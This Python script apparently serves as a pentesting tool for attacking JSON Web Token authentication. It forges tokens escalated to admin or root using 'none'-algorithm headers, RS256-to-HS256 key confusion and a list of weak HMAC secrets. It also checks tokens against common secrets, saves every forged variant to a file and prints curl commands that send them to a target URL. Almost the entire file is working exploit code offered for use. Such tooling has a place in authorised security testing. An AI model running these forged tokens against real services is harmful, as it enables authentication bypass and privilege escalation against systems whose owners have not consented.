#!/usr/bin/env python3
"""
Complete JWT Testing Workflow
Combines all JWT attack techniques in one script
"""

import base64
import json
import hmac
import hashlib
import sys
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def url_safe_b64_decode(data):
    """Decode URL-safe base64"""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data)

def url_safe_b64_encode(data):
    """Encode to URL-safe base64"""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def create_rsa_public_key_from_n_e(n_b64, e=65537):
    """Create RSA public key from modulus (n) and exponent (e)"""
    try:
        n_bytes = url_safe_b64_decode(n_b64)
        n = int.from_bytes(n_bytes, 'big')
        public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
        return public_key
    except Exception as e:
        print(f"Error creating public key: {e}")
        return None

def quick_analysis(token):
    """Quick JWT analysis"""
    parts = token.split('.')
    if len(parts) != 3:
        return None, None, None
    
    try:
        header = json.loads(url_safe_b64_decode(parts[0]))
        payload = json.loads(url_safe_b64_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except:
        return None, None, None

def generate_all_bypass_tokens(payload, public_key):
    """Generate all possible bypass tokens"""
    tokens = {}
    
    # Modified payloads for testing
    payloads = {
        'original': payload.copy(),
        'admin': {**payload, 'sub': 'admin', 'role': 'admin', 'admin': True, 'exp': 9999999999},
        'root': {**payload, 'sub': 'root', 'role': 'root', 'admin': True, 'exp': 9999999999},
        'extended_exp': {**payload, 'exp': 9999999999}
    }
    
    for payload_name, test_payload in payloads.items():
        payload_b64 = url_safe_b64_encode(json.dumps(test_payload, separators=(',', ':')).encode())
        
        # 1. None algorithm variants
        none_headers = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"typ": "JWT"},  # Missing alg
            {"alg": "", "typ": "JWT"},  # Empty alg
            {"alg": None, "typ": "JWT"}  # Null alg
        ]
        
        for i, header in enumerate(none_headers):
            header_b64 = url_safe_b64_encode(json.dumps(header, separators=(',', ':')).encode())
            tokens[f'{payload_name}_none_{i+1}'] = f"{header_b64}.{payload_b64}."
        
        # 2. HS256 algorithm confusion (if public key available)
        if public_key:
            pem_key = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            hs256_header = {"alg": "HS256", "typ": "JWT"}
            header_b64 = url_safe_b64_encode(json.dumps(hs256_header, separators=(',', ':')).encode())
            
            # Full PEM key
            signing_input = f"{header_b64}.{payload_b64}"
            signature = hmac.new(
                pem_key,
                signing_input.encode('utf-8'),
                hashlib.sha256
            ).digest()
            signature_b64 = url_safe_b64_encode(signature)
            tokens[f'{payload_name}_hs256_full'] = f"{header_b64}.{payload_b64}.{signature_b64}"
            
            # Stripped PEM key
            pem_stripped = pem_key.decode().replace('-----BEGIN PUBLIC KEY-----', '').replace('-----END PUBLIC KEY-----', '').replace('\n', '')
            signature = hmac.new(
                pem_stripped.encode(),
                signing_input.encode('utf-8'),
                hashlib.sha256
            ).digest()
            signature_b64 = url_safe_b64_encode(signature)
            tokens[f'{payload_name}_hs256_stripped'] = f"{header_b64}.{payload_b64}.{signature_b64}"
        
        # 3. Common weak secrets (if HMAC)
        weak_secrets = ['', 'secret', 'key', 'test', '123', 'jwt', 'admin']
        for secret in weak_secrets:
            hs256_header = {"alg": "HS256", "typ": "JWT"}
            header_b64 = url_safe_b64_encode(json.dumps(hs256_header, separators=(',', ':')).encode())
            signing_input = f"{header_b64}.{payload_b64}"
            
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha256
            ).digest()
            signature_b64 = url_safe_b64_encode(signature)
            tokens[f'{payload_name}_weak_{secret or "empty"}'] = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    return tokens

def test_common_secrets(token):
    """Test common weak secrets"""
    header, payload, signature = quick_analysis(token)
    if not header or header.get('alg') not in ['HS256', 'HS384', 'HS512']:
        return None
    
    alg = header.get('alg')
    hash_func = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512
    }[alg]
    
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}"
    actual_signature = parts[2]
    
    weak_secrets = [
        '', 'secret', 'key', 'password', '123', 'test', 'admin', 'jwt',
        'supersecret', 'topsecret', 'your-256-bit-secret', 'change-me'
    ]
    
    for secret in weak_secrets:
        expected_signature = hmac.new(
            secret.encode('utf-8'),
            header_payload.encode('utf-8'),
            hash_func
        ).digest()
        expected_signature_b64 = url_safe_b64_encode(expected_signature)
        
        if expected_signature_b64 == actual_signature:
            return secret
    
    return None

def main():
    if len(sys.argv) < 2:
        print("🎯 Complete JWT Testing Workflow")
        print("\nUsage: python3 jwt_complete_test.py <JWT_TOKEN> [target_url]")
        print("\nExamples:")
        print("  python3 jwt_complete_test.py 'eyJ...'")
        print("  python3 jwt_complete_test.py 'eyJ...' 'https://api.target.com/admin'")
        return
    
    token = sys.argv[1].strip()
    target_url = sys.argv[2] if len(sys.argv) > 2 else None
    
    print("🎯 Complete JWT Security Testing")
    print("=" * 50)
    
    # 1. Basic Analysis
    print("\n[1] 🔍 Basic Token Analysis")
    header, payload, signature = quick_analysis(token)
    
    if not header or not payload:
        print("❌ Invalid JWT format")
        return
    
    print(f"Algorithm: {header.get('alg', 'unknown')}")
    print(f"Subject: {payload.get('sub', 'unknown')}")
    print(f"Role: {payload.get('role', 'not specified')}")
    
    if 'exp' in payload:
        exp_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(payload['exp']))
        current_time = int(time.time())
        if payload['exp'] < current_time:
            print(f"⚠️  Expired: {exp_date}")
        else:
            print(f"✅ Expires: {exp_date}")
    
    # 2. Secret Brute Force (for HMAC tokens)
    if header.get('alg') in ['HS256', 'HS384', 'HS512']:
        print("\n[2] 🔐 Testing Weak Secrets")
        secret = test_common_secrets(token)
        if secret:
            print(f"🎯 WEAK SECRET FOUND: '{secret}'")
            print("   You can now forge tokens with this secret!")
        else:
            print("❌ No common weak secrets found")
            print("   Try: python3 jwt_secret_bruteforce.py '<token>' -w wordlist.txt")
    
    # 3. Generate Attack Tokens
    print("\n[3] 🛠️  Generating Attack Tokens")
    
    # Create public key
    public_key_n = "uwoGuY-6oDHYznmLZ5wDZXKpTN6h1-wyZsxLjnh7BpS6sR1VxzI8B_9hNPPvnhVrBxhMoitg1hPSxLTN5fYUZj-5Ykb1H7W4yTcRkOKvUTxERogVtQL4fBayKdI9vbGQKRqCx095CM0_JZ-tGlxnhWMuRaWpOb7pUMfSkpPgl6Npod5JGbkSzM0iekAQsV0tadT1lGz7cWJhATmfRzRLwCnP5jzTYRIiro00kz2srMVrzha8egKYtZDgjwkcg3XmKRF-QZwzLofLRo7gWA8WLdoh6iXiNTaHqCJ3WvKLE58KQbp0fYk2QRwexquDOrYHPo_Yb54gila9qydkS0DvlQ"
    public_key = create_rsa_public_key_from_n_e(public_key_n)
    
    attack_tokens = generate_all_bypass_tokens(payload, public_key)
    
    print(f"Generated {len(attack_tokens)} attack variants")
    
    # Show most promising attacks
    promising_attacks = [
        'admin_none_1',
        'admin_hs256_full', 
        'admin_weak_secret',
        'admin_weak_empty',
        'root_none_1'
    ]
    
    print("\n📋 Most Promising Attacks:")
    for attack in promising_attacks:
        if attack in attack_tokens:
            token_preview = attack_tokens[attack][:60] + "..."
            print(f"  {attack}: {token_preview}")
    
    # 4. Save tokens to file
    output_file = "jwt_attack_tokens.txt"
    with open(output_file, 'w') as f:
        f.write("# JWT Attack Tokens\n")
        f.write(f"# Generated from: {token[:50]}...\n")
        f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        for attack_name, attack_token in attack_tokens.items():
            f.write(f"# {attack_name}\n")
            f.write(f"{attack_token}\n\n")
    
    print(f"\n💾 All {len(attack_tokens)} tokens saved to: {output_file}")
    
    # 5. Testing recommendations
    print("\n[4] 🚀 Next Steps")
    print("\n📋 Manual Testing:")
    for i, (attack_name, attack_token) in enumerate(list(attack_tokens.items())[:5], 1):
        print(f"  {i}. Test {attack_name}:")
        if target_url:
            print(f"     curl -H 'Authorization: Bearer {attack_token}' {target_url}")
        else:
            print(f"     curl -H 'Authorization: Bearer {attack_token}' <TARGET_URL>")
    
    print("\n🔧 Automated Testing:")
    if target_url:
        print(f"  python3 jwt_advanced_bypass.py '{token}' '{target_url}'")
    else:
        print(f"  python3 jwt_advanced_bypass.py '{token}' '<TARGET_URL>'")
    
    print("\n📊 Deep Analysis:")
    print(f"  python3 jwt_analyzer.py '{token}'")
    
    if header.get('alg') in ['HS256', 'HS384', 'HS512']:
        print("\n🔓 Secret Brute Force:")
        print(f"  python3 jwt_secret_bruteforce.py '{token}' -w rockyou.txt")
    
    print("\n=== Summary ===")
    vulnerabilities = []
    
    if header.get('alg') == 'RS256':
        vulnerabilities.append("Algorithm confusion possible (RS256->HS256)")
    if header.get('alg') in ['HS256', 'HS384', 'HS512']:
        vulnerabilities.append("HMAC algorithm - test for weak secrets")
    if 'exp' in payload and payload['exp'] < int(time.time()):
        vulnerabilities.append("Token is expired")
    if len(signature) < 20:
        vulnerabilities.append("Short signature - possibly weak")
    
    if vulnerabilities:
        print("⚠️  Potential vulnerabilities found:")
        for vuln in vulnerabilities:
            print(f"   • {vuln}")
    else:
        print("✅ No obvious vulnerabilities detected")
    
    print(f"\n🎯 Generated {len(attack_tokens)} attack tokens - test them all!")

if __name__ == "__main__":
    main()

